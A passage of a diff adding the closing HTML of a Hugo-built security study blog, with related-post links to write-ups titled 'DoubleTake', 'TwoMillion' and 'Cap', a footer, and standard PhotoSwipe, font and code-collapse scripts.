+    <a href="/p/19.-doubletake/">
+        
+        
+            <div class="article-image">
+                <img src="/p/19.-doubletake/assets/image-20261113211115576.69ccc0ab3b3b5141786756fb894ded08_hu5599740394217170900.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 19. DoubleTake"
+                        
+                        data-hash="md5-aczAqzs7UUF4Z1b7iU3tCA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">19. DoubleTake</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/15.-twomillion/">
+        
+        
+            <div class="article-image">
+                <img src="/p/15.-twomillion/assets/image-20261109110807877.d619cdf339ca6a409d090c0a0a10808d_hu2928835098330789906.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 15. TwoMillion"
+                        
+                        data-hash="md5-1hnN8znKakCdCQwKChCAjQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">15. TwoMillion</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/14.-cap/">
+        
+        
+            <div class="article-image">
+                <img src="/p/14.-cap/assets/image-20261108105321725.ca37d98cbd0867071a239ed30859a09c_hu2194329561987376679.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 14. Cap"
+                        
+                        data-hash="md5-yjfZjL0IZwcaI57TCFmgnA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">14. Cap</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Sp1ke
+    </section>
+    
+    <section class="powerby">
+        
+            记录安全学习 <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+.article-content .highlight-wrap {
+  position: relative;
+  overflow: hidden;
+  border-radius: var(--card-border-radius);
+}
+.article-content .highlight-wrap .highlight {
+  margin:0;
+}
+ 
+.article-content .highlight-wrap.collapse {
+  max-height: 380px;
+}
+ 
+.article-content .highlight-wrap.collapse::after {
+  content: "";
+  position: absolute;
+  left:0;
+  bottom:0;
+  width:100%;
+  height: 80px;
+  background: linear-gradient(transparent, var(--pre-background-color));
+  pointer-events: none;
+}
+ 
+.article-content .code-expand-btn {
+  position:absolute;
+  bottom:8px;
+  right:12px;
+  z-index:2;
+  border: none;
+  padding: 4px 8px;
+  border-radius: 6px;
+  background: var(--card-background);
+  color: var(--text-color);
+  cursor: pointer;
+}
+</style>
+<script>
+document.addEventListener('DOMContentLoaded', ()=>{
+  document.querySelectorAll('.highlight-wrap').forEach(wrap=>{
+    const btn = wrap.querySelector('.code-expand-btn');
+    btn.addEventListener('click', ()=>{
+      wrap.classList.toggle('collapse');
+      btn.innerText = wrap.classList.contains('collapse') ? "▼ 展开" : "▲ 收起";
+    })
+  })
+})
+</script>
+
+    </body>
+</html>
